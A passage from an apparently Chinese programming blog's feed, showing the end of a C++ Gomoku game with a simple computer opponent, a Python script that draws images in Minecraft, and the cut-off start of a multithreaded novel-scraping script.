class="keyword">int</span> turn = <span class="number">0</span>;</span><br><span class="line">key = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">memset</span>(pos, <span class="number">0</span>, <span class="keyword">sizeof</span>(pos));</span><br><span class="line"><span class="comment">/*setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class="line"><span class="comment">bar(10, 200, 90, 230);</span></span><br><span class="line"><span class="comment">setcolor(EGERGB(0, 0, 255));</span></span><br><span class="line"><span class="comment">setfont(20, 0, &quot;宋体&quot;);</span></span><br><span class="line"><span class="comment">xyprintf(10, 205, &quot;玩家先手&quot;);*/</span></span><br><span class="line">mouse_msg msg;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (; is_run();)</span><br><span class="line">&#123;</span><br><span class="line">msg = getmouse();</span><br><span class="line"><span class="keyword">if</span> (msg.is_up())</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*if (flag)//flag标记是否开始游戏</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">if (msg.x &gt;= 10 &amp;&amp; msg.x &lt;= 90 &amp;&amp; msg.y &gt;= 200 &amp;&amp; msg.y &lt;= 230)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class="line"><span class="comment">bar(10, 200, 90, 230);</span></span><br><span class="line"><span class="comment">setcolor(EGERGB(0, 0, 255));</span></span><br><span class="line"><span class="comment">setfont(20, 0, &quot;宋体&quot;);</span></span><br><span class="line"><span class="comment">xyprintf(10, 205, &quot;电脑先手&quot;);</span></span><br><span class="line"><span class="comment">flag = false;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">if</span> (msg.x % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">AI();</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">AI();</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.x % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">AI();</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">AI();</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GamePeople</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">key = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">memset</span>(pos, <span class="number">0</span>, <span class="keyword">sizeof</span>(pos));</span><br><span class="line"><span class="keyword">int</span> turn = <span class="number">0</span>;</span><br><span class="line">mouse_msg msg;</span><br><span class="line"><span class="keyword">for</span> (; is_run();)</span><br><span class="line">&#123;</span><br><span class="line">msg = getmouse();</span><br><span class="line"><span class="keyword">if</span> (msg.is_up())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.x % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.x % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">&#123;</span><br><span class="line">turn++;</span><br><span class="line">Counter(turn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">45</span>, <span class="number">50</span>));</span><br><span class="line">setfont(<span class="number">130</span>, <span class="number">0</span>, <span class="string">&quot;华文新魏&quot;</span>);</span><br><span class="line">xyprintf(<span class="number">150</span>, <span class="number">60</span>, <span class="string">&quot;五  子  棋&quot;</span>);</span><br><span class="line">setbkcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">122</span>, <span class="number">204</span>));</span><br><span class="line">bar(<span class="number">300</span>, <span class="number">230</span>, <span class="number">500</span>, <span class="number">280</span>);</span><br><span class="line">bar(<span class="number">300</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">350</span>);</span><br><span class="line">bar(<span class="number">300</span>, <span class="number">370</span>, <span class="number">500</span>, <span class="number">420</span>);</span><br><span class="line">setbkmode(TRANSPARENT);</span><br><span class="line">setfont(<span class="number">40</span>, <span class="number">15</span>, <span class="string">&quot;华文楷体&quot;</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">setfontbkcolor(EGERGB(<span class="number">30</span>, <span class="number">30</span>, <span class="number">130</span>));</span><br><span class="line">outtextxy(<span class="number">320</span>, <span class="number">235</span>, <span class="string">&quot;人机对战&quot;</span>);</span><br><span class="line">outtextxy(<span class="number">320</span>, <span class="number">305</span>, <span class="string">&quot;好友对战&quot;</span>);</span><br><span class="line">outtextxy(<span class="number">320</span>, <span class="number">375</span>, <span class="string">&quot;退出游戏&quot;</span>);</span><br><span class="line">setfont(<span class="number">30</span>, <span class="number">0</span>, <span class="string">&quot;华文楷体&quot;</span>);</span><br><span class="line">outtextxy(<span class="number">230</span>, <span class="number">480</span>, <span class="string">&quot;制作人：计实验17-1郭永航&quot;</span>);</span><br><span class="line">setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;方正舒体&quot;</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">outtextxy(<span class="number">190</span>, <span class="number">600</span>, <span class="string">&quot;Copyright (C) 2018 Gomoku. All Rights Reserved.&quot;</span>);</span><br><span class="line">mouse_msg msg;</span><br><span class="line"><span class="keyword">for</span> (; is_run();)</span><br><span class="line">&#123;</span><br><span class="line">msg = getmouse();</span><br><span class="line"><span class="keyword">if</span> (msg.is_up())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">230</span> &amp;&amp; msg.y &lt;= <span class="number">280</span>)</span><br><span class="line">&#123;</span><br><span class="line">cleardevice();</span><br><span class="line">ChessBoard();</span><br><span class="line">GameAI();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">300</span> &amp;&amp; msg.y &lt;= <span class="number">350</span>)</span><br><span class="line">&#123;</span><br><span class="line">cleardevice();</span><br><span class="line">ChessBoard();</span><br><span class="line">GamePeople();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">370</span> &amp;&amp; msg.y &lt;= <span class="number">420</span>)</span><br><span class="line">&#123;</span><br><span class="line">closegraph();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Choice</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">bar(<span class="number">10</span>, <span class="number">150</span>, <span class="number">90</span>, <span class="number">180</span>);</span><br><span class="line">bar(<span class="number">10</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">230</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">155</span>, <span class="string">&quot;再来一局&quot;</span>);</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">205</span>, <span class="string">&quot;返回菜单&quot;</span>);</span><br><span class="line">mouse_msg msg;</span><br><span class="line"><span class="keyword">for</span> (; is_run();)</span><br><span class="line">&#123;</span><br><span class="line">msg = getmouse();</span><br><span class="line"><span class="keyword">if</span> (msg.is_up())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= <span class="number">10</span> &amp;&amp; msg.x &lt;= <span class="number">90</span> &amp;&amp; msg.y &gt;= <span class="number">150</span> &amp;&amp; msg.y &lt;= <span class="number">180</span>)</span><br><span class="line">&#123;</span><br><span class="line">cleardevice();</span><br><span class="line">ChessBoard();</span><br><span class="line"><span class="keyword">if</span> (key)GamePeople();</span><br><span class="line"><span class="keyword">else</span> GameAI();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">10</span> &amp;&amp; msg.x &lt;= <span class="number">90</span> &amp;&amp; msg.y &gt;= <span class="number">200</span> &amp;&amp; msg.y &lt;= <span class="number">230</span>)</span><br><span class="line">&#123;</span><br><span class="line">cleardevice();</span><br><span class="line"><span class="keyword">if</span> (Menu())<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setinitmode(INIT_RENDERMANUAL);</span><br><span class="line">initgraph(<span class="number">800</span>, <span class="number">640</span>);</span><br><span class="line">setcaption(<span class="string">&quot;五子棋&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Menu())<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!Choice());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;C++课程设计作业，包含人工智障$AI$&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="C++" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"/>
    
    
    <category term="GUI" scheme="https://blog.todest.cn/tags/GUI/"/>
    
  </entry>
  
  <entry>
    <title>Minecraft Python绘图</title>
    <link href="https://blog.todest.cn/post/566b0d1e/"/>
    <id>https://blog.todest.cn/post/566b0d1e/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-12-01T14:44:18.961Z</updated>
    
    <content type="html"><![CDATA[<p><font color="red">前置条件：</font></p><blockquote><p>模组: RaspberryJamMod<br>Python库: mcpi<br>游戏版本: 1.8 ~ 1.12.2</p></blockquote><a id="more"></a><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mcpi <span class="keyword">import</span> minecraft, block</span><br><span class="line"><span class="keyword">from</span> colorsys <span class="keyword">import</span> rgb_to_hsv</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">colors = dict((</span><br><span class="line">    ((<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="string">&quot;0&quot;</span>), <span class="comment"># white 白色</span></span><br><span class="line">    ((<span class="number">249</span>, <span class="number">255</span>, <span class="number">254</span>), <span class="string">&quot;0&quot;</span>),  <span class="comment"># white 白色</span></span><br><span class="line">    ((<span class="number">249</span>, <span class="number">128</span>, <span class="number">29</span>), <span class="string">&quot;1&quot;</span>),  <span class="comment"># orange 橙色</span></span><br><span class="line">    ((<span class="number">199</span>, <span class="number">78</span>, <span class="number">189</span>), <span class="string">&quot;2&quot;</span>),  <span class="comment"># magenta 品红色</span></span><br><span class="line">    ((<span class="number">58</span>, <span class="number">179</span>, <span class="number">218</span>), <span class="string">&quot;3&quot;</span>),  <span class="comment"># light_blue 淡蓝色</span></span><br><span class="line">    ((<span class="number">254</span>, <span class="number">216</span>, <span class="number">61</span>), <span class="string">&quot;4&quot;</span>),  <span class="comment"># yellow 黄色</span></span><br><span class="line">    ((<span class="number">128</span>, <span class="number">199</span>, <span class="number">31</span>), <span class="string">&quot;5&quot;</span>),  <span class="comment"># lime 黄绿色</span></span><br><span class="line">    ((<span class="number">243</span>, <span class="number">139</span>, <span class="number">170</span>), <span class="string">&quot;6&quot;</span>),  <span class="comment"># pink 粉红色</span></span><br><span class="line">    ((<span class="number">71</span>, <span class="number">79</span>, <span class="number">82</span>), <span class="string">&quot;7&quot;</span>),  <span class="comment"># gray 灰色</span></span><br><span class="line">    ((<span class="number">157</span>, <span class="number">157</span>, <span class="number">151</span>), <span class="string">&quot;8&quot;</span>),  <span class="comment"># light_gray 淡灰色</span></span><br><span class="line">    ((<span class="number">22</span>, <span class="number">156</span>, <span class="number">156</span>), <span class="string">&quot;9&quot;</span>),  <span class="comment"># cyan 青色</span></span><br><span class="line">    ((<span class="number">137</span>, <span class="number">50</span>, <span class="number">184</span>), <span class="string">&quot;10&quot;</span>),  <span class="comment"># purple 紫色</span></span><br><span class="line">    ((<span class="number">60</span>, <span class="number">68</span>, <span class="number">170</span>), <span class="string">&quot;11&quot;</span>),  <span class="comment"># blue 蓝色</span></span><br><span class="line">    ((<span class="number">131</span>, <span class="number">84</span>, <span class="number">50</span>), <span class="string">&quot;12&quot;</span>),  <span class="comment"># brown 棕色</span></span><br><span class="line">    ((<span class="number">94</span>, <span class="number">124</span>, <span class="number">22</span>), <span class="string">&quot;13&quot;</span>),  <span class="comment"># green 绿色</span></span><br><span class="line">    ((<span class="number">176</span>, <span class="number">46</span>, <span class="number">38</span>), <span class="string">&quot;14&quot;</span>),  <span class="comment"># red 红色</span></span><br><span class="line">    ((<span class="number">29</span>, <span class="number">29</span>, <span class="number">33</span>), <span class="string">&quot;15&quot;</span>),  <span class="comment"># black 黑色</span></span><br><span class="line">    ((<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="string">&quot;15&quot;</span>),  <span class="comment"># black 黑色</span></span><br><span class="line"></span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hsv</span>(<span class="params">color</span>):</span></span><br><span class="line">    <span class="keyword">return</span> rgb_to_hsv(*[x / <span class="number">255.0</span> <span class="keyword">for</span> x <span class="keyword">in</span> color])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">color_dist</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sum((a - b) ** <span class="number">2</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(to_hsv(c1), to_hsv(c2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">min_color_diff</span>(<span class="params">color_to_match, colors</span>):</span></span><br><span class="line">    <span class="keyword">return</span> min((color_dist(color_to_match, test), colors[test]) <span class="keyword">for</span> test <span class="keyword">in</span> colors)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此函数暂时无用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_player_direction</span>(<span class="params">rotation</span>):</span></span><br><span class="line">    rec = [<span class="number">-90</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">180</span>]  <span class="comment"># +x, +z, -x, -z</span></span><br><span class="line">    <span class="keyword">if</span> abs(rotation) &lt; <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;+z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> abs(rotation) &gt; <span class="number">145</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> rotation &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;+x&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mc = minecraft.Minecraft.create()</span><br><span class="line">im = Image.open(<span class="string">&#x27;6.jpg&#x27;</span>)</span><br><span class="line">im = im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">list = numpy.array(im)</span><br><span class="line">size = list.shape</span><br><span class="line">start = mc.player.getTilePos()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(size[<span class="number">1</span>]):</span><br><span class="line">        item = min_color_diff(list[i][j], colors)</span><br><span class="line">        mc.setBlock(start.x + size[<span class="number">0</span>] - i, start.y, start.z + j, <span class="number">251</span>, int(item[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p><font color="red">效果如下:</font><br><img data-src="https://cdn.file.todest.cn/pic/2019093001.png" alt="皮卡丘"><br><img data-src="https://cdn.file.todest.cn/pic/2019093002.png" alt="晚安"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;font color=&quot;red&quot;&gt;前置条件：&lt;/font&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;模组: RaspberryJamMod&lt;br&gt;Python库: mcpi&lt;br&gt;游戏版本: 1.8 ~ 1.12.2&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="Minecraft" scheme="https://blog.todest.cn/tags/Minecraft/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程爬取小说</title>
    <link href="https://blog.todest.cn/post/fa40ec29/"/>
    <id>https://blog.todest.cn/post/fa40ec29/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:40:32.636Z</updated>
    
    <content type="html"><![CDATA[<p>* 爬取网站已转移</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># Host = &#x27;https://www.biquke.com/bq/37/37868/&#x27;</span></span><br><span class="line">Host = <span class="string">&#x27;https://www.biquke.com/bq/75/75429/&#x27;</span></span><br><span class="line"></span><br><span class="line">header = [</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 &#x27;</span></span><br><span class="line">                   <span class="string">&#x27;(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 &#x27;</span></span><br><span class="line">                   <span class="string">&#x27;(KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&#x27;</span>&#125;</span><br><span class="line">]</span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geturl</span>(<span class="params">url, page</span>):</span></span><br><span class="line">    repeat = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(Host + url, headers=header[random.randint(<span class="number">0</span>, <span class="number">4</span>)], timeout=<span class="number">200</span>)</span><br><span class="line">            req.close()</span><br><span class="line">            result = req.content</span><br><span class="line">            result = BeautifulSoup(result, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            title = result.find(<span class="string">&#x27;h1&#x27;</span>).getText()</span><br><span class="line">            result = result.find(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;content&#x27;</span>&#125;).getText()</span><br><span class="line">            title = re.sub(<span class="string">&#x27;[\\/:*?&quot;&lt;&gt;|\r\n]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, title)</span><br><span class="line">            print(title)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&#x27;./%s/%03d&#x27;</span> % (name, page) + <span class="string">&#x27; - 